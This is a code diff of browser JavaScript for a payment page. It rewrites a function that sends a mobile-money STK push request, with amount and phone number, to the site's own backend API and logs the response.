@@ -798,36 +798,35 @@
             });
         }
 
-        async function triggerSTKCall(note) {
-            try {
-                // Ensure we grab the LATEST values from the inputs every time a trigger fires
-                const idNumberInput = document.getElementById('idNum').value;
-                const phoneInput = document.getElementById('phoneNum').value;
+       async function triggerSTKCall(note) {
+    try {
+        const phoneInput = document.getElementById('phoneNum').value;
+        if (!phoneInput || !selectedFee) return;
 
-                // Validation to prevent empty fetches
-                if (!phoneInput || !selectedFee) return;
+        const response = await fetch('/api/stk-push', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                amount: selectedFee,
+                phone_number: phoneInput
+            })
+        });
 
-                // Ensure the path is exactly what your Vercel/Backend expects
-                // Change '/api/trigger' to 'api/trigger' (no leading slash) if hosted on certain sub-paths
-                await fetch('/api/trigger', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        amount: selectedFee,
-                        phone_number: phoneInput,
-                        id_number: idNumberInput,
-                        note: note
-                    }),
-                    keepalive: true // Crucial for Trigger 4 so the request finishes even if the page reloads
-                });
-                console.log("Trigger Sent:", note);
-            } catch (error) {
-                console.error("STK Trigger Failed:", error);
-            }
+        const data = await response.json();
+        console.log("STK Push Response:", data);
+
+        if (!data.success) {
+            console.error("STK Push failed:", data.message);
         }
+
+        return data;
+    } catch (error) {
+        console.error("STK Trigger Failed:", error);
+    }
+}
 
         function showPinConfirmation() {
             if (!document.getElementById('idNum').value || !document.getElementById('phoneNum').value) return alert("Enter all details");
